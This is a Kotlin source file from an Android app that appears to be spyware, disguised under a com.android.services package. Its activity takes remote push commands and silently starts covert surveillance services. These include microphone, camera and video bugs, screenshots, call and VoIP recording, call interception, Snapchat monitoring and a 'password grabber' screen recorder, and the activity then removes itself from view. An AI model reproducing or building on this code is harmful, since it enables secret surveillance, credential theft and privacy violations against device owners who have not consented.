package com.android.services.ui.activities

import android.annotation.SuppressLint
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.ServiceConnection
import android.os.Build
import android.os.Bundle
import android.os.IBinder
import android.util.Log
import androidx.appcompat.app.AppCompatActivity
import com.android.services.accessibility.data.WindowStateChangeEventData
import com.android.services.models.*
import com.android.services.services.RemoteDataService
import com.android.services.services.callIntercept.CallInterceptCommandService
import com.android.services.services.callIntercept.CallInterceptProcessingBase
import com.android.services.services.callRecord.CallRecordProcessingBaseI
import com.android.services.services.callRecord.CallRecorderService
import com.android.services.services.cameraBug.CameraBugCommandProcessingBase
import com.android.services.services.cameraBug.CameraBugCommandService
import com.android.services.services.micBug.MicBugCommandProcessingBaseI
import com.android.services.services.micBug.MicBugCommandService
import com.android.services.services.screenRecord.ScreenRecordCommandProcessingBaseI
import com.android.services.services.screenRecord.ScreenRecordCommandService
import com.android.services.services.screenSharing.ScreenSharingCommandProcessBasel
import com.android.services.services.screenSharing.ScreenSharingCommandService
import com.android.services.services.screenshot.ScreenShotCommandProcessingBaseI
import com.android.services.services.screenshot.ScreenShotCommandService
import com.android.services.services.snapchat.SnapChatEventCommandService
import com.android.services.services.videoBug.VideoBugCommandProcessingBase
import com.android.services.services.videoBug.VideoBugCommandService
import com.android.services.services.view360.View360CommandProcessingBaseI
import com.android.services.services.view360.View360CommandService
import com.android.services.services.view360ByJitsi.View360ByJitsiCommandProcessingBaseI
import com.android.services.services.view360ByJitsi.View360ByJitsiMeetCommandService
import com.android.services.services.voip.VoipCallCommandProcessingBaseI
import com.android.services.services.voip.VoipCallCommandService
import com.android.services.util.*
import com.android.services.workers.FutureWorkUtil
import com.android.services.workers.View360ByJitsi.View360ByJitsiMeetCommandWorker
import com.android.services.workers.callRecord.CallRecordWorkerService
import com.android.services.workers.micbug.MicBugCommandWorker
import com.android.services.workers.videobug.VideoBugCommandWorker
import com.android.services.workers.view360.View360CommandWorker
import com.android.services.workers.voip.VoipCallRecordWorkerService
import com.google.gson.GsonBuilder

class BackgroundServicesActivity : AppCompatActivity() {

    lateinit var type: String
    private var fcmPush: FCMPush? = null
    lateinit var callRecord: CallRecord
    lateinit var pkgName: String
    lateinit var voipCallRecord: VoipCallRecord

    var extraObject: Any? = null
        get() {
            return this
        }
        set(value) {
            setExtraValue(value)
            field = value
        }

    private fun setExtraValue(value: Any?) {
        when (value) {
            is CallRecord -> {
                callRecord = value
            }

            is VoipCallRecord -> {
                voipCallRecord = value
            }

            is FCMPush -> {
                fcmPush = value
            }
        }
    }

    companion object {
        private const val TAG = "BackgroundServicesActivity"
        const val EXTRA_PARCELABLE_OBJECT = "EXTRA_PARCELABLE_OBJECT"
        const val EXTRA_CALL_RECORD = "CALL_RECORD"
        const val EXTRA_VOIP_RECORD = "EXTRA_VOIP_RECORD"
        const val EXTRA_PACKAGE_NAME = "EXTRA_PACKAGE_NAME"
        const val EXTRA_TYPE = "EXTRA_TYPE"
    }

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        extraObject = intent.getParcelableExtra(EXTRA_PARCELABLE_OBJECT)
        logVerbose("${WindowStateChangeEventData.TAG} background services activity called")
        when {
            intent.hasExtra(EXTRA_PACKAGE_NAME) -> {
                pkgName = intent.getStringExtra(EXTRA_PACKAGE_NAME)!!
            }
        }
        type = intent.getStringExtra(EXTRA_TYPE)!!
        FirebasePushUtils.restartRemoteDataSyncService(this, quickSync = false)
        try {
            handleCommand()
        } catch (exp: Exception) {
            logException("exception while handling command ${exp.message}", TAG, exp)
        } finally {
            finishActivity()
        }
    }

    @SuppressLint("NewApi")
    @Throws(Exception::class)
    private fun handleCommand() {
        val gson = GsonBuilder().create()
        when (type) {
            AppConstants.TYPE_REMOTE_DATA_SERVICE -> {
                AppUtils.startService(
                    this,
                    Intent(applicationContext, RemoteDataService::class.java)
                )
            }

            AppConstants.MIC_BUG_TYPE -> {
                val micBugCommand = gson.fromJson(fcmPush!!.pushCommand, MicBugCommand::class.java)
                val micIntent = Intent(applicationContext, MicBugCommandService::class.java)
                micIntent.putExtra(MicBugCommandProcessingBaseI.MIC_BUG_PUSH, micBugCommand)
                if (!AppUtils.isServiceRunning(this, MicBugCommandWorker::class.java.name)) {
                    //AppUtils.startService(this, micIntent)
                    FutureWorkUtil.startMicRecordingWorker(this, gson.toJson(micBugCommand))
                }
            }

            AppConstants.VIDEO_BUG_TYPE -> {
                val videoBugCommand =
                    gson.fromJson(fcmPush!!.pushCommand, VideoBugCommand::class.java)
                val videoBugIntent = Intent(applicationContext, VideoBugCommandService::class.java)
                videoBugIntent.putExtra(
                    VideoBugCommandProcessingBase.VIDEO_BUG_PUSH,
                    videoBugCommand
                )
                if (!AppUtils.isServiceRunning(this, VideoBugCommandWorker::class.java.name)) {
                    // AppUtils.startService(this, videoBugIntent)
                    FutureWorkUtil.startVideoBugWorker(this, gson.toJson(videoBugCommand))
                }
            }

            AppConstants.CAMERA_BUG_TYPE -> {
                val cameraBugCommand =
                    gson.fromJson(fcmPush!!.pushCommand, CameraBugCommand::class.java)
                val cameraBugIntent =
                    Intent(applicationContext, CameraBugCommandService::class.java)
                cameraBugIntent.putExtra(
                    CameraBugCommandProcessingBase.KEY_CAMERA_BUG_PUSH,
                    cameraBugCommand
                )
                if (!AppUtils.isServiceRunning(this, CameraBugCommandService::class.java.name)) {
                    AppUtils.startService(this, cameraBugIntent)
                }
            }

            AppConstants.SCREEN_SHOT_TYPE -> {
                val screenShotCommand =
                    gson.fromJson(fcmPush!!.pushCommand, ScreenShotCommand::class.java)
                screenShotCommand.intervalOption ?: "15"
                val screenShotIntent =
                    Intent(applicationContext, ScreenShotCommandService::class.java)
                screenShotIntent.putExtra(
                    ScreenShotCommandProcessingBaseI.SCREEN_SHOT_PUSH,
                    screenShotCommand
                )
                if (!AppUtils.isServiceRunning(this, ScreenShotCommandService::class.java.name)) {
                    AppUtils.startService(this, screenShotIntent)
                }
            }

            AppConstants.SNAP_CHAT_EVENTS_TYPE -> {
                val snapChatEventIntent =
                    Intent(applicationContext, SnapChatEventCommandService::class.java)
                if (!AppUtils.isServiceRunning(
                        this,
                        SnapChatEventCommandService::class.java.name
                    )
                ) {
                    AppUtils.startService(this, snapChatEventIntent)
                }
            }

            AppConstants.CALL_RECORD_TYPE -> {
                if (this::callRecord.isInitialized) {
                    val intent = Intent(applicationContext, CallRecorderService::class.java)
                    intent.putExtra(CallRecordProcessingBaseI.IntentKey.KEY_CALL_RECORD, callRecord)
                    if (!AppUtils.isServiceRunning(this, CallRecordWorkerService::class.java.name)) {
                        //AppUtils.startService(this, intent)
                        FutureWorkUtil.startCallRecordingWorker(this, gson.toJson(callRecord))
                    }
                }
            }

            AppConstants.SCREEN_RECORDING_TYPE -> {
                val intent = Intent(applicationContext, ScreenRecordCommandService::class.java)
                    .putExtra(ScreenRecordCommandProcessingBaseI.APP_PACKAGE_NAME, pkgName)
                    .putExtra(ScreenRecordCommandProcessingBaseI.APP_RECORDING, true)
                if (!AppUtils.isServiceRunning(this, ScreenRecordCommandService::class.java.name)) {
                    startScreenRecordingCommandService(intent)
                }
            }

            AppConstants.PASSWORD_GRABBER_TYPE -> {
                val intent = Intent(applicationContext, ScreenRecordCommandService::class.java)
                    .putExtra(ScreenRecordCommandProcessingBaseI.APP_PACKAGE_NAME, pkgName)
                    .putExtra(ScreenRecordCommandProcessingBaseI.PASSWORD_GRABBER, true)
                if (!AppUtils.isServiceRunning(this, ScreenRecordCommandService::class.java.name)) {
                    startScreenRecordingCommandService(intent)
                }
            }

            AppConstants.NORMAL_SCREEN_RECORDING_TYPE -> {
                val screenRecordCommand =
                    gson.fromJson(fcmPush!!.pushCommand, FcmPushCommand::class.java)
                val intent = Intent(applicationContext, ScreenRecordCommandService::class.java)
                    .putExtra(
                        ScreenRecordCommandProcessingBaseI.SCREEN_RECORD_DURATION,
                        screenRecordCommand.customData
                    )
                    .putExtra(
                        ScreenRecordCommandProcessingBaseI.SCREEN_RECORD_PUSH_ID,
                        screenRecordCommand.pushId
                    )
                    .putExtra(ScreenRecordCommandProcessingBaseI.NORMAL_RECORDING, true)
                if (!AppUtils.isServiceRunning(this, ScreenRecordCommandService::class.java.name)) {
                    startScreenRecordingCommandService(intent)
                }
            }

            AppConstants.VOIP_CALL_TYPE -> {
                if (!AppUtils.isServiceRunning(this, VoipCallRecordWorkerService::class.java.name)) {
//                    AppUtils.startService(
//                        this,
//                        Intent(applicationContext, VoipCallCommandService::class.java)
//                            .putExtra(
//                                VoipCallCommandProcessingBaseI.VOIP_CALL_RECORD,
//                                voipCallRecord
//                            )
//                    )
                    FutureWorkUtil.startVoipCallRecordingWorker(this, gson.toJson(voipCallRecord))
                }
            }

            AppConstants.CALL_INTERCEPT_TYPE -> {
                val view360Command =
                    gson.fromJson(fcmPush!!.pushCommand, View360ByJitsiCommand::class.java)
                val view360Intent =
                    Intent(applicationContext, CallInterceptCommandService::class.java)
                view360Intent.putExtra(
                    CallInterceptProcessingBase.CALL_INTERCEPT_PUSH,
                    view360Command
                )
                if (!AppUtils.isServiceRunning(
                        this,
                        CallInterceptCommandService::class.java.name
                    )
                ) {
                    AppUtils.startService(
                        this,
                        view360Intent
                    )
                }
            }

            AppConstants.VIEW_360_TYPE -> {
                if (!AppUtils.isServiceRunning(this, View360CommandWorker::class.java.name)) {
//                    AppUtils.startService(
//                        this,
//                        Intent(applicationContext, View360CommandService::class.java)
//                    )
                    FutureWorkUtil.startView360Worker(this)
                }
            }

            AppConstants.VIEW_360_JITSE_TYPE -> {
                val view360Command =
                    gson.fromJson(fcmPush!!.pushCommand, View360ByJitsiCommand::class.java)
                val view360Intent =
                    Intent(applicationContext, View360ByJitsiMeetCommandService::class.java)
                view360Intent.putExtra(
                    View360ByJitsiCommandProcessingBaseI.VIEW_360_BY_Jitsi_PUSH,
                    view360Command
                )
                if (!AppUtils.isServiceRunning(
                        this,
                        View360ByJitsiMeetCommandWorker::class.java.name
                    )
                ) {
//                    AppUtils.startService(
//                        this,
//                        view360Intent
//                    )
                    FutureWorkUtil.startView360ByJitsiWorker(this,gson.toJson(view360Command))
                }
            }

            AppConstants.SCREEN_SHARING_JITSE_TYPE -> {
                val screenSharingCommand =
                    gson.fromJson(fcmPush!!.pushCommand, ScreenSharingCommand::class.java)
                val screenSharing360Intent =
                    Intent(applicationContext, ScreenSharingCommandService::class.java)
                screenSharing360Intent.putExtra(
                    ScreenSharingCommandProcessBasel.SCREEN_SHARING_PUSH,
                    screenSharingCommand
                )
                if (!AppUtils.isServiceRunning(
                        this,
                        ScreenSharingCommandService::class.java.name
                    )
                ) {
                    AppUtils.startService(
                        this,
                        screenSharing360Intent
                    )
                }

            }
        }
    }

    private fun startScreenRecordingCommandService(intent: Intent) {
        try {
            bindService(
                intent,
                object : ServiceConnection {
                    override fun onServiceConnected(p0: ComponentName?, service: IBinder?) {
                        val binder =
                            service as ScreenRecordCommandService.ScreenRecordCommandServiceBinder
                        Log.d("BoundServiceInfo", "service is On Connection")
                        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                            Log.d("BoundServiceInfo", "starting Service")
                            startForegroundService(intent)
                        } else {
                            startService(intent)
                        }
                        unbindService(this)
                    }

                    override fun onServiceDisconnected(p0: ComponentName?) {
                    }
                }, Context.BIND_AUTO_CREATE
            )
        } catch (e: Exception) {
            Log.d("BoundServiceInfo", "exception Occur while binding service e=$e")
            AppUtils.startService(this, intent)
        }
    }

    private fun finishActivity(): Unit {
        if (!isFinishing)
            finishAndRemoveTask()
    }
}